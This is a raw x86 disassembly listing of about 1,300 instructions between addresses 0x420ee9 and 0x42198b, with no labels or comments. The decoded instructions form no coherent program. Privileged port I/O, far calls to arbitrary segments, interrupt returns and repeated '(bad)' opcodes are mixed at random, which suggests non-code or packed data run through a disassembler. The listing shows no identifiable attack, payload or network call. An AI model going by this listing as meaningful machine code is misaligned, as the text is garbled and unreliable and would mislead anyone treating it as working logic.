  420ee9:	rcl    BYTE PTR [edx+esi*4+0x128f546a],0x7a
  420ef1:	pop    eax
  420ef2:	cmp    ecx,DWORD PTR [ecx+0x6cb11bdf]
  420ef8:	ss sub al,0x73
  420efb:	adc    BYTE PTR [esi+0x69],0x29
  420eff:	dec    eax
  420f00:	jo     0x420f79
  420f02:	aad    0x3e
  420f04:	test   al,0xc1
  420f06:	scas   eax,DWORD PTR es:[edi]
  420f07:	ficomp WORD PTR [ecx+0x32]
  420f0a:	leave  
  420f0b:	xchg   esp,eax
  420f0c:	popa   
  420f0d:	rol    DWORD PTR [ecx],1
  420f0f:	mov    eax,0x72
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x2271c6f2]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x61000001
  420f8d:	cmp    BYTE PTR [ecx+ebx*8-0x486a7561],0x23
  420f95:	sub    eax,0x5c9644ef
  420f9a:	in     al,dx
  420f9b:	dec    edi
  420f9c:	hlt    
  420f9d:	fstp   DWORD PTR [esi-0x5e]
  420fa0:	mov    cl,0xa
  420fa2:	fldcw  WORD PTR [ebx-0x4d]
  420fa5:	cwde   
  420fa6:	sbb    eax,0x405fdc42
  420fab:	sbb    al,0x9f
  420fad:	adc    DWORD PTR [eax-0x107361cb],esi
  420fb3:	jae    0x420fde
  420fb5:	sbb    edi,DWORD PTR [edx+0x1f6c0906]
  420fbb:	clc    
  420fbc:	xchg   BYTE PTR [ecx-0x52114a10],bh
  420fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fc3:	mov    bh,BYTE PTR [esi+0x2dff66ea]
  420fc9:	std    
  420fca:	sub    ecx,DWORD PTR [esi+0x2]
  420fcd:	retf   0x5ad5
  420fd0:	loope  0x420fb6
  420fd2:	inc    BYTE PTR [edi]
  420fd4:	or     dh,BYTE PTR [edx-0x64]
  420fd7:	pop    eax
  420fd8:	vpsadbw xmm0,xmm1,XMMWORD PTR [ebx]
  420fdc:	mov    dl,0x88
  420fde:	test   BYTE PTR [esi+0x3d],bl
  420fe1:	cli    
  420fe2:	push   0x6b32c330
  420fe7:	sti    
  420fe8:	sub    eax,ebp
  420fea:	mov    eax,ds:0x565a6adf
  420fef:	dec    DWORD PTR [edi+0x3b]
  420ff2:	repnz or DWORD PTR [ebx-0x61],0xd81d2b70
  420ffa:	test   esi,eax
  420ffc:	push   eax
  420ffd:	pop    esp
  420ffe:	(bad)  
  421000:	jmp    0x6cc158fa
  421005:	fimul  DWORD PTR [esi-0x58]
  421008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421009:	pop    esp
  42100a:	jns    0x421084
  42100c:	and    ax,0x2eaa
  421010:	mov    edx,0x9af25cf1
  421015:	cwde   
  421016:	pop    esp
  421017:	mov    eax,0xdc700bdc
  42101c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42101d:	adc    esi,DWORD PTR [edi-0x7ecd3db2]
  421023:	out    0xcb,al
  421025:	stos   BYTE PTR es:[edi],al
  421026:	shl    BYTE PTR [ecx+0x316ba566],cl
  42102c:	jle    0x42107b
  42102e:	xor    ah,bl
  421030:	sub    ebx,DWORD PTR [esi]
  421032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421033:	push   0x4
  421035:	inc    ebx
  421036:	and    al,0x62
  421038:	push   ebp
  421039:	dec    edi
  42103a:	imul   ecx,DWORD PTR [ecx+0x1de21efa],0x77
  421041:	mov    ch,0x9c
  421043:	lods   eax,DWORD PTR ds:[esi]
  421044:	push   edx
  421045:	mov    dh,0x31
  421047:	int    0xe6
  421049:	jns    0x420ff8
  42104b:	test   eax,0xd7e3d252
  421050:	pusha  
  421051:	iret   
  421052:	mov    edi,0x1137b7c3
  421057:	push   bp
  421059:	dec    ecx
  42105a:	xchg   ebp,eax
  42105b:	xchg   edi,eax
  42105c:	add    DWORD PTR [ecx-0x11],esi
  42105f:	dec    DWORD PTR [ebx]
  421061:	mov    eax,0xd63f9a24
  421066:	add    BYTE PTR [ecx],bl
  421068:	add    DWORD PTR [ecx-0x700dfc0b],edi
  42106e:	popa   
  42106f:	push   esp
  421070:	in     eax,dx
  421071:	add    DWORD PTR [esi+0x2655a81e],ebx
  421077:	out    dx,al
  421078:	push   ss
  421079:	leave  
  42107a:	add    DWORD PTR [eax],0xde9e3c62
  421080:	push   ebp
  421081:	and    cl,BYTE PTR [edx]
  421083:	jp     0x42101a
  421085:	xchg   ebx,eax
  421086:	rcr    ebx,cl
  421088:	cdq    
  421089:	mov    BYTE PTR ds:[ebp+ecx*1+0x5aea09cc],dh
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    fs,WORD PTR [eax+eiz*1]
  421102:	inc    edi
  421103:	stc    
  421104:	cwde   
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x7000001
  42110d:	push   0xc2defef0
  421112:	in     eax,dx
  421113:	ja     0x4210e4
  421115:	(bad)  
  421116:	jg     0x4210c2
  421118:	leave  
  421119:	mov    esi,0xd5eba9a7
  42111e:	and    ebx,ecx
  421120:	adc    ebx,DWORD PTR [esi-0x7046dd5]
  421126:	(bad)  
  421127:	das    
  421128:	cmp    eax,DWORD PTR [edx+0x56]
  42112b:	sub    BYTE PTR [eax],cl
  42112d:	jp     0x421197
  42112f:	pop    esp
  421130:	iret   
  421131:	jb     0x421178
  421133:	adc    eax,0x43f951ab
  421138:	test   DWORD PTR [ebx+0x49],0xabf8055a
  42113f:	push   es
  421140:	and    DWORD PTR [edx+0x6d],edx
  421143:	pop    ds
  421144:	xor    BYTE PTR [ebx],ah
  421146:	mov    BYTE PTR [ebx],dl
  421148:	mov    al,0x83
  42114a:	fcom   DWORD PTR [esi]
  42114c:	add    ecx,ecx
  42114e:	push   esp
  42114f:	je     0x421166
  421151:	jno    0x421190
  421153:	jno    0x421182
  421155:	cmp    BYTE PTR [edi+0x7a],0x7c
  421159:	pop    esi
  42115a:	in     al,0xc8
  42115c:	pop    es
  42115d:	out    0x63,eax
  42115f:	jae    0x421162
  421161:	push   ebx
  421162:	mov    esp,0x131a758c
  421167:	xchg   DWORD PTR [eax+eax*1-0xb],eax
  42116b:	inc    ecx
  42116c:	cmc    
  42116d:	out    0x1d,al
  42116f:	and    DWORD PTR [eax],eax
  421171:	mov    ebx,0x16935abc
  421176:	imul   edx,DWORD PTR [edx+eiz*8-0x4ae39d65],0x6cece9a8
  421181:	pop    ebp
  421182:	lea    ecx,[edi]
  421184:	cld    
  421185:	mov    al,ds:0x5b282ad5
  42118a:	xchg   edi,eax
  42118b:	add    al,0x3d
  42118d:	test   al,dh
  42118f:	mov    WORD PTR [ebx],ss
  421191:	jle    0x421115
  421193:	xor    eax,0x281f3a32
  421198:	fistp  DWORD PTR [ebx]
  42119a:	(bad)  
  42119b:	fistp  WORD PTR [edx-0x79]
  42119e:	popf   
  42119f:	add    eax,0x3689c55a
  4211a4:	(bad)  
  4211a6:	test   eax,0xb9f69322
  4211ab:	(bad)  
  4211ac:	push   esp
  4211ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ae:	dec    edi
  4211af:	std    
  4211b0:	fidiv  DWORD PTR [esi]
  4211b2:	jecxz  0x42122b
  4211b4:	cmp    ecx,DWORD PTR [esi]
  4211b6:	push   es
  4211b7:	out    dx,al
  4211b8:	int3   
  4211b9:	in     eax,0xea
  4211bb:	mov    cs,WORD PTR [ecx+ebp*4+0x18]
  4211bf:	mov    esi,DWORD PTR [edi-0x16bb750f]
  4211c5:	mov    ch,0x84
  4211c7:	fisubr WORD PTR [eax+edx*8+0x7e]
  4211cb:	das    
  4211cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211cd:	fdivr  QWORD PTR [esi-0x1]
  4211d0:	not    DWORD PTR [eax]
  4211d2:	push   edi
  4211d3:	mov    bl,0x1c
  4211d5:	aad    0xf4
  4211d7:	ds retf 
  4211d9:	add    eax,0xdcffe354
  4211de:	ret    
  4211df:	mov    ds:0xd8a9c505,al
  4211e4:	inc    ecx
  4211e5:	push   0x55
  4211e7:	pop    edx
  4211e8:	mov    ebx,0x50bb261a
  4211ed:	pop    ecx
  4211ef:	imul   ebp,DWORD PTR gs:0xec13278b,0x6d
  4211f7:	aam    0x8
  4211f9:	lds    ebp,FWORD PTR [ecx+esi*4+0x6fb2da2e]
  421200:	test   al,0x66
  421202:	mov    WORD PTR [eax],cs
  421204:	sahf   
  421205:	jns    0x42119f
  421207:	cmp    esp,DWORD PTR [ebx-0x1703e1c9]
  42120d:	fmul   QWORD PTR [esi]
  42120f:	and    eax,0x2d
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0xf97ab32d
  421281:	or     al,0x9b
  421283:	test   eax,0x1619d
  421288:	add    eax,0x72000001
  42128d:	mov    bh,0x78
  42128f:	pushf  
  421290:	ins    BYTE PTR es:[edi],dx
  421291:	rcr    BYTE PTR [eax-0x10],0x6f
  421295:	fisttp QWORD PTR [ebp-0x3ab4b1ee]
  42129b:	mov    esp,0x5871b18d
  4212a0:	nop
  4212a1:	inc    edx
  4212a2:	bound  esp,QWORD PTR [edi]
  4212a4:	test   DWORD PTR [ecx+0x7],ebx
  4212a7:	in     eax,0x1c
  4212a9:	lock in eax,0x30
  4212ac:	push   es
  4212ad:	add    BYTE PTR [ebx-0xa],bl
  4212b0:	add    ah,BYTE PTR [edx-0x21]
  4212b3:	ds cmp eax,esp
  4212b6:	mov    ecx,0x3a93d5cd
  4212bb:	xchg   edx,eax
  4212bc:	lea    ebp,[esi+ecx*2-0x74]
  4212c0:	jo     0x4212ca
  4212c2:	xchg   DWORD PTR [esi+0x402e0eb9],esi
  4212c8:	inc    ecx
  4212c9:	sub    eax,0xe55c75d9
  4212ce:	div    bh
  4212d0:	retf   0x818a
  4212d3:	mov    eax,ds:0xeb746e11
  4212d8:	jae    0x4212c9
  4212da:	inc    ebx
  4212db:	les    esp,FWORD PTR [edi-0x6526b261]
  4212e1:	push   ecx
  4212e2:	scas   al,BYTE PTR es:[edi]
  4212e3:	xlat   BYTE PTR ds:[ebx]
  4212e4:	add    dl,cl
  4212e6:	out    0xb1,eax
  4212e8:	push   edi
  4212e9:	inc    esi
  4212ea:	jae    0x421284
  4212ec:	into   
  4212ed:	jnp    0x4212c7
  4212ef:	cmp    bh,BYTE PTR [edx+esi*1]
  4212f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212f3:	jmp    0x4212b9
  4212f5:	lock jb 0x421326
  4212f8:	mov    cs,WORD PTR ds:0xb4acc1ad
  4212fe:	cli    
  4212ff:	loopne 0x42130a
  421301:	pop    esi
  421302:	jb     0x42131f
  421304:	sbb    eax,0xfaeb2e8d
  421309:	mov    al,0x59
  42130b:	sbb    eax,0x50515df6
  421310:	adc    BYTE PTR [eax-0x3e],cl
  421313:	es ret 0x17e0
  421317:	jae    0x4212b8
  421319:	ffree  st(1)
  42131b:	adc    esp,edx
  42131d:	sub    BYTE PTR gs:[eax],bh
  421320:	mov    bl,0x5f
  421322:	dec    esp
  421323:	es int 0x23
  421326:	hlt    
  421327:	push   esp
  421328:	pop    edi
  421329:	(bad)  
  42132b:	mov    ch,0x83
  42132d:	fidiv  DWORD PTR [ecx]
  42132f:	or     dh,BYTE PTR [edi-0x7b]
  421332:	rcl    DWORD PTR [eax+esi*1],cl
  421335:	stos   BYTE PTR es:[edi],al
  421336:	push   ss
  421337:	aas    
  421338:	ret    
  421339:	cmp    al,0x6c
  42133b:	in     al,0xc7
  42133d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42133e:	or     ecx,DWORD PTR [ebp-0x3f6585ee]
  421344:	icebp  
  421345:	mov    bh,cl
  421347:	sub    bh,ch
  421349:	sbb    BYTE PTR [esi-0x3],bl
  42134c:	sbb    BYTE PTR [edx+0x1cd74f68],ch
  421352:	adc    esp,DWORD PTR fs:[ecx]
  421355:	addr16 data16 out dx,al
  421358:	sbb    DWORD PTR [edi],edi
  42135a:	shr    BYTE PTR [ebx-0x66],0x25
  42135e:	xor    ebx,esp
  421360:	pop    edx
  421361:	sahf   
  421362:	ret    
  421363:	pop    edx
  421364:	push   es
  421365:	data16 fadd DWORD PTR [esi+0x2a797ef3]
  42136c:	adc    DWORD PTR [ecx],0xffffffe2
  42136f:	push   edi
  421370:	push   edi
  421371:	and    eax,0x75b0e412
  421376:	sbb    ah,BYTE PTR [ecx+edi*8]
  421379:	jno    0x4213c8
  42137b:	xchg   edi,eax
  42137c:	scas   eax,DWORD PTR es:[edi]
  42137d:	pop    ecx
  42137e:	fstp   TBYTE PTR [ebp+0x7]
  421381:	sbb    al,0x76
  421383:	sub    al,0x17
  421385:	mov    esp,0x3efcd943
  42138a:	sar    ah,0xb7
  42138d:	rcl    DWORD PTR [ebx+0xbcd2],0x0
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x7652f49f]
  421402:	lock add ah,BYTE PTR [edx+0x5000162]
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    BYTE PTR [ebp+0x1b99ca67],dh
  421411:	jmp    0x421485
  421413:	pop    ss
  421414:	in     al,dx
  421415:	xor    BYTE PTR [ebp-0xe238fa2],bh
  42141b:	cli    
  42141c:	mov    ebp,0x808bdd3f
  421421:	mov    WORD PTR [edi],ds
  421423:	mov    ebx,0xab26b1fd
  421428:	pop    ebx
  421429:	leave  
  42142a:	mov    al,ds:0x81e9b99a
  42142f:	push   ecx
  421430:	mov    bh,0x42
  421432:	mov    dl,0x9d
  421434:	push   esi
  421435:	cmp    eax,0xadc3a7d3
  42143a:	adc    DWORD PTR ds:0x2ffbb57b,0xffffff9e
  421441:	retf   0x393
  421444:	mov    bl,0xc5
  421446:	call   DWORD PTR [edx+ecx*4+0x28]
  42144a:	scas   eax,DWORD PTR es:[edi]
  42144b:	inc    esp
  42144c:	adc    al,0x3
  42144e:	add    dh,BYTE PTR [edi+0x33b16193]
  421454:	add    al,0x16
  421456:	fsubr  QWORD PTR [eax-0x2c]
  421459:	js     0x421487
  42145b:	inc    edi
  42145c:	test   al,0x37
  42145e:	sbb    BYTE PTR [esi-0x1f755742],ch
  421464:	pop    ds
  421465:	fcom   DWORD PTR [edx+0x5c635472]
  42146b:	in     al,0x7
  42146d:	rcl    BYTE PTR [edi+0x1f],cl
  421470:	arpl   WORD PTR [eax],bx
  421472:	sbb    ch,BYTE PTR [eax-0x67]
  421475:	aam    0x23
  421477:	ja     0x4214d1
  421479:	mov    ?,WORD PTR [ebp+edx*8-0x5f5f9068]
  421480:	push   cs
  421481:	in     al,dx
  421482:	fs and bl,ch
  421485:	push   0xfd664d2e
  42148a:	mov    edi,0x163a0817
  42148f:	sub    eax,0xddd779c0
  421494:	cli    
  421495:	sbb    eax,0x9b8993d7
  42149a:	sub    eax,DWORD PTR [ebp+edx*8+0x2d277c65]
  4214a1:	xor    ecx,DWORD PTR [eax+0x779b30c4]
  4214a7:	pop    ss
  4214a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a9:	in     eax,0x14
  4214ab:	out    0x94,eax
  4214ad:	jecxz  0x421476
  4214af:	pop    ds
  4214b0:	pop    ecx
  4214b1:	ins    DWORD PTR es:[edi],dx
  4214b2:	push   cs
  4214b3:	sub    esp,esi
  4214b5:	pop    ds
  4214b6:	push   0x31
  4214b8:	aas    
  4214b9:	xor    DWORD PTR [eax+0x7b],0xffffffe4
  4214bd:	shl    BYTE PTR [ecx],0xb
  4214c0:	cmp    ah,BYTE PTR [edi+0xdaf5a3e]
  4214c6:	ret    0xc6f3
  4214c9:	lods   al,BYTE PTR ds:[esi]
  4214ca:	lea    edx,[edx+0x472ae2d6]
  4214d0:	dec    esp
  4214d1:	jo     0x421490
  4214d3:	cwde   
  4214d4:	daa    
  4214d5:	iret   
  4214d6:	in     ax,dx
  4214d8:	xor    dl,bl
  4214da:	into   
  4214db:	js     0x4214fd
  4214dd:	mov    ch,0xdb
  4214df:	mov    WORD PTR [esi-0xb],?
  4214e2:	enter  0xa4c7,0xc6
  4214e6:	cmp    eax,0x18e18071
  4214eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ec:	les    ecx,FWORD PTR [edi+esi*1-0x317ec004]
  4214f3:	fisttp QWORD PTR [ebx-0x9a4d88]
  4214f9:	in     al,dx
  4214fa:	cmp    BYTE PTR [ebx+0x5b],bl
  4214fd:	or     BYTE PTR [eax-0x19],bh
  421500:	(bad)  
  421501:	mov    ch,0x43
  421503:	outs   dx,DWORD PTR ds:[esi]
  421504:	jbe    0x421491
  421506:	fstp   QWORD PTR [ebx+0x5cb35191]
  42150c:	sub    DWORD PTR [ecx+esi*4+0x1fe0],esi
	...
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x6075bd4c],bp
  421582:	pop    edi
  421583:	call   0x105:0x163a7
  42158a:	add    BYTE PTR [eax],al
  42158c:	cwde   
  42158d:	aaa    
  42158e:	mov    WORD PTR [esp+edx*2-0x6ef0d591],ss
  421595:	and    BYTE PTR [ecx+0x2],dl
  421598:	addr16 sbb al,0x49
  42159b:	mov    esp,DWORD PTR [ebx-0x2e213d22]
  4215a1:	pop    es
  4215a2:	xor    ebx,ebp
  4215a4:	pop    bx
  4215a6:	test   BYTE PTR [edi+0x1a4e90ba],bl
  4215ac:	and    edx,DWORD PTR [eax+0xf4e6e96]
  4215b2:	fstp   TBYTE PTR [esi+0x24fbc8ee]
  4215b8:	mov    bl,0xfc
  4215ba:	outs   dx,BYTE PTR ds:[esi]
  4215bb:	stc    
  4215bc:	cld    
  4215bd:	ficom  WORD PTR [eax-0x47]
  4215c0:	or     eax,0x9bb5b9b8
  4215c5:	inc    esp
  4215c6:	sar    DWORD PTR [ebx],1
  4215c8:	inc    ebx
  4215c9:	retf   
  4215ca:	mov    dh,0xdc
  4215cc:	stos   BYTE PTR es:[edi],al
  4215cd:	sub    eax,0x1e2890b2
  4215d2:	call   0x3b1d:0x591e2392
  4215d9:	mov    ebp,DWORD PTR [ecx]
  4215db:	xchg   esi,eax
  4215dc:	mov    dl,0x8d
  4215de:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215e0:	or     BYTE PTR [eax+0x7eaca250],ch
  4215e6:	loop   0x42159a
  4215e8:	sahf   
  4215e9:	cmp    eax,0xdc37ee56
  4215ee:	fmulp  st(1),st
  4215f0:	ds mov esi,0xee2785f9
  4215f6:	imul   esi,DWORD PTR [edx],0xb71ece1f
  4215fc:	or     DWORD PTR [eax-0x6e],eax
  4215ff:	xchg   esp,eax
  421600:	push   esp
  421601:	mov    cl,0xd7
  421603:	pusha  
  421604:	and    dl,BYTE PTR [ebx-0x24643d52]
  42160a:	push   ss
  42160b:	mov    ebp,0xfffb7406
  421610:	dec    esi
  421611:	jg     0x42166a
  421613:	(bad)  [ebx]
  421615:	clc    
  421616:	sbb    ebp,DWORD PTR [eax+0x13]
  421619:	aad    0x74
  42161b:	dec    esi
  42161c:	mov    ecx,0x6bfa7fae
  421621:	cld    
  421622:	mov    ah,BYTE PTR [edx+ebp*2-0x19496afd]
  421629:	ja     0x4215f1
  42162b:	mov    cl,0xeb
  42162d:	push   edx
  42162e:	mov    eax,DWORD PTR [ebx+0x75ff82a3]
  421634:	adc    ecx,edi
  421636:	pusha  
  421637:	add    eax,0x5839c99
  42163c:	das    
  42163d:	out    0x2a,eax
  42163f:	rcl    DWORD PTR [eax],1
  421641:	sbb    eax,0xc51b1fa7
  421646:	fimul  DWORD PTR [esi+ecx*8-0x60d9bec2]
  42164d:	iret   
  42164e:	inc    esi
  42164f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421650:	adc    BYTE PTR [eax+0x71],bl
  421653:	(bad)  
  421654:	(bad)  
  421656:	mov    cl,0x81
  421658:	ins    DWORD PTR es:[edi],dx
  421659:	lahf   
  42165a:	jmp    0x10c8:0xddf8ca15
  421661:	push   ebx
  421662:	dec    edx
  421663:	mov    dh,0xc5
  421665:	inc    ebx
  421666:	or     DWORD PTR [edx+ebp*1-0x5e5b4874],edx
  42166d:	push   ebp
  42166e:	loope  0x421639
  421670:	call   0xcbff51cb
  421675:	aaa    
  421676:	xchg   DWORD PTR [eax-0x44],edx
  421679:	fisttp QWORD PTR [edx-0x3a]
  42167c:	ins    DWORD PTR es:[edi],dx
  42167d:	push   ds
  42167e:	inc    esi
  42167f:	loop   0x4216d5
  421681:	(bad)  
  421682:	mov    ebx,0xc23e9d6c
  421687:	add    eax,0x578d718d
  42168c:	clc    
  42168d:	pushf  
  42168e:	aaa    
  42168f:	push   cs
  421690:	add    DWORD PTR [eax],0x0
	...
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	and    eax,0xacfc3a8e
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0xe6000001
  42170d:	aas    
  42170e:	sbb    al,0xd7
  421710:	cli    
  421711:	mov    ecx,es
  421713:	and    al,0x77
  421715:	mov    ch,0xca
  421717:	inc    eax
  421718:	ss pop edx
  42171a:	arpl   WORD PTR [edx-0x2e4d6c11],sp
  421720:	loop   0x4216ea
  421722:	push   eax
  421723:	icebp  
  421724:	dec    ecx
  421725:	int    0x24
  421727:	push   ecx
  421728:	xchg   DWORD PTR [esi+0x66f995d3],edx
  42172e:	adc    BYTE PTR [edx],bl
  421730:	mov    cl,0x3c
  421732:	into   
  421733:	cs popa 
  421735:	and    ebp,DWORD PTR [ecx-0x2f]
  421738:	fistp  WORD PTR [eax]
  42173a:	xlat   BYTE PTR ds:[ebx]
  42173b:	out    dx,al
  42173c:	push   cs
  42173d:	pop    ebx
  42173e:	fwait
  42173f:	(bad)  
  421740:	jmp    0x42179c
  421742:	int    0x96
  421744:	xchg   edx,eax
  421745:	mov    fs,WORD PTR [edi+0x2d5c5fd5]
  42174b:	in     eax,dx
  42174c:	lds    ebx,FWORD PTR [edi]
  42174e:	sar    DWORD PTR [edx-0x5eedf661],1
  421754:	in     eax,0x91
  421756:	(bad)  
  421757:	fucom  st(0)
  421759:	rcl    al,cl
  42175b:	aad    0xc3
  42175d:	add    eax,0x5c3e34bc
  421762:	jp     0x421712
  421764:	dec    ebp
  421765:	out    dx,eax
  421766:	cli    
  421767:	inc    edx
  421768:	jl     0x42170a
  42176a:	or     eax,0x49199473
  42176f:	sbb    eax,DWORD PTR [edx-0x139ff0a2]
  421775:	call   0x3fc8:0x517c8700
  42177c:	repnz sbb DWORD PTR [ecx+esi*4+0x635378d3],ecx
  421784:	push   eax
  421785:	not    bl
  421787:	(bad)  
  421789:	into   
  42178a:	jge    0x421754
  42178c:	test   al,0x46
  42178e:	sub    BYTE PTR [ecx+esi*1-0x1066474c],bl
  421795:	mov    ds:0xd3043620,eax
  42179a:	popa   
  42179b:	sbb    eax,0x4149c70a
  4217a0:	pop    esp
  4217a1:	popf   
  4217a2:	aas    
  4217a3:	xchg   esi,eax
  4217a4:	adc    DWORD PTR [ebx-0x9cfea1c],0x99e0fcfa
  4217ae:	add    eax,DWORD PTR [ebp-0x2620a2c5]
  4217b4:	xchg   ebp,eax
  4217b5:	xor    BYTE PTR [edi],bh
  4217b7:	xor    BYTE PTR [edi-0x10],cl
  4217ba:	pop    ss
  4217bb:	inc    ebp
  4217bc:	out    0x3c,eax
  4217be:	jne    0x421799
  4217c0:	rol    cl,cl
  4217c2:	lods   eax,DWORD PTR ds:[esi]
  4217c3:	pop    ebx
  4217c4:	or     eax,0x3278474b
  4217c9:	or     bl,BYTE PTR [ecx+0x5a661a0d]
  4217cf:	call   0x9e0e:0xcdae9fb2
  4217d6:	push   0x3e
  4217d8:	push   0x4b8f69e7
  4217dd:	jb     0x4217d2
  4217df:	mov    al,ds:0x249506b4
  4217e4:	mov    dh,0x86
  4217e6:	jo     0x4217be
  4217e8:	pop    ecx
  4217e9:	add    esi,edx
  4217eb:	dec    eax
  4217ec:	add    eax,0x79ca6c50
  4217f1:	inc    edi
  4217f2:	std    
  4217f3:	and    al,dh
  4217f5:	adc    dh,bl
  4217f7:	rcl    DWORD PTR [ebp-0x2bb355d3],1
  4217fd:	sbb    esi,DWORD PTR [edx]
  4217ff:	ss int3 
  421801:	outs   dx,BYTE PTR ds:[esi]
  421802:	add    cl,ah
  421804:	outs   dx,BYTE PTR ds:[esi]
  421805:	sar    BYTE PTR [esi+0x2d],0x76
  421809:	sub    BYTE PTR [ecx],al
  42180b:	shr    DWORD PTR [eax-0x4620baf4],cl
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	mov    ebp,0xb192effb
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    eax,0x72000001
  42188d:	imul   ebx,DWORD PTR [ebp-0x3a18664d],0x25
  421894:	xchg   ecx,eax
  421895:	lds    edx,FWORD PTR [ebx+ebx*1]
  421898:	in     al,dx
  421899:	mov    edi,0xac2c38b8
  42189e:	dec    ecx
  42189f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218a0:	nop
  4218a1:	fdivr  QWORD PTR [edi-0x6]
  4218a4:	or     esi,DWORD PTR ds:0x1d8d34b2
  4218aa:	test   ecx,ebx
  4218ac:	pop    ds
  4218ad:	add    BYTE PTR [eax+eiz*8],bh
  4218b0:	xchg   DWORD PTR [edx+0xf28823b],esi
  4218b6:	dec    eax
  4218b7:	push   ss
  4218b8:	sahf   
  4218b9:	out    dx,eax
  4218ba:	iret   
  4218bb:	push   esp
  4218bc:	inc    ebx
  4218bd:	pop    ecx
  4218be:	dec    eax
  4218bf:	fdivp  st(3),st
  4218c1:	in     al,dx
  4218c2:	xchg   esi,eax
  4218c3:	lods   eax,DWORD PTR ds:[esi]
  4218c4:	fimul  DWORD PTR [edx+0xc]
  4218c7:	adc    eax,ebx
  4218c9:	cmp    ah,cl
  4218cb:	test   BYTE PTR [esi+ebp*8+0x71],ah
  4218cf:	retf   
  4218d0:	and    al,0xd0
  4218d2:	js     0x42189a
  4218d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218d5:	jmp    0xc7839b8f
  4218da:	or     dh,ch
  4218dc:	xchg   esp,eax
  4218dd:	inc    ecx
  4218de:	pop    ebx
  4218df:	ins    BYTE PTR es:[edi],dx
  4218e0:	out    dx,eax
  4218e1:	aaa    
  4218e2:	push   ebp
  4218e3:	inc    ecx
  4218e4:	or     al,0xa0
  4218e6:	jge    0x42193d
  4218e8:	ja     0x42188e
  4218ea:	js     0x4218ad
  4218ec:	fisubr WORD PTR [esi+0x19ab3f07]
  4218f2:	test   al,0x8
  4218f4:	mov    DWORD PTR [edx],ebx
  4218f6:	add    dl,BYTE PTR [ebx-0x79f3343b]
  4218fc:	mov    ss,edx
  4218fe:	mov    cl,0x3f
  421900:	push   ecx
  421901:	imul   edi,DWORD PTR [ecx+ebx*4+0x5734942c],0xffffffe4
  421909:	cmp    al,0x68
  42190b:	(bad)  
  42190c:	rol    eax,1
  42190e:	sub    edx,DWORD PTR [ebp-0x72]
  421911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421912:	xchg   BYTE PTR [ecx-0x6f1ab91b],ah
  421918:	and    cl,0x63
  42191b:	dec    edi
  42191c:	cmp    bh,BYTE PTR [ebx-0x50]
  42191f:	mov    bh,0xe0
  421921:	jl     0x421900
  421923:	pop    edx
  421924:	cmp    ecx,DWORD PTR [ebp+0x7]
  421927:	add    ebp,DWORD PTR [eax-0x343b60c3]
  42192d:	je     0x4218f3
  42192f:	scas   eax,DWORD PTR es:[edi]
  421930:	add    BYTE PTR [eax],cl
  421932:	adc    DWORD PTR [ebp+0xe],eax
  421935:	ror    BYTE PTR [eax-0xd17a1ee],1
  42193b:	(bad)  
  42193d:	adc    bl,BYTE PTR [esi+0x48]
  421940:	jno    0x42194d
  421942:	dec    eax
  421943:	push   cs
  421944:	xor    bl,BYTE PTR [edi-0xf]
  421947:	test   eax,0xa1b8c07b
  42194c:	scas   eax,DWORD PTR es:[edi]
  42194d:	cmp    edi,0x36d6dc8c
  421953:	sub    ah,BYTE PTR [ebp-0x7b]
  421956:	sub    eax,0xc5b8fc4c
  42195b:	xchg   BYTE PTR [eax-0x53],al
  42195e:	or     DWORD PTR [ebx-0x6a],ebx
  421961:	(bad)  
  421962:	and    BYTE PTR [edi-0x2f],bh
  421965:	adc    eax,0x6bdac423
  42196a:	rcl    BYTE PTR [ebp-0x6096d2fe],1
  421970:	mov    ah,BYTE PTR [eax+0x48]
  421973:	jbe    0x4219b8
  421975:	(bad)  
  421976:	in     eax,dx
  421977:	sbb    DWORD PTR [esp+edi*4+0x7cdfae9e],0xae4cbc9f
  421982:	xor    eax,0xe624d979
  421987:	add    al,0x43
  421989:	or     al,0xef
  42198b:	xlat   BYTE PTR ds:[ebx]
